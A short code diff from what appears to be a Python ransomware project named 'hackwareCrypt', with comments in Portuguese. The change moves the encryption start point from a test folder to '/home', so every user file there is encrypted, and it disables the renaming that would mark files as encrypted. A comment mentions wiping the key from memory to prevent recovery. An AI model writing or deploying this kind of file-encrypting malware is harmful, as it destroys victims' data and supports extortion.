@@ -57,14 +57,14 @@ def main():
         cryptFn = crypt.decrypt
 
     # altere isto para a sua necessidade
-    init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
-    startdirs = [init_path]
+    #init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
+    startdirs = ['/home']
 
     for currentDir in startdirs:
         for filename in discovery.discover(currentDir):
             Crypter.change_files(filename, cryptFn)
             # Renomeia o arquivo pra indicar a encriptação
-            os.rename(filename, filename+'.hackwareCrypt')
+            #os.rename(filename, filename+'.hackwareCrypt')
 
     # Limpa a chave de encriptação da Memória
     # para evitar a recuperação através de ferramentas
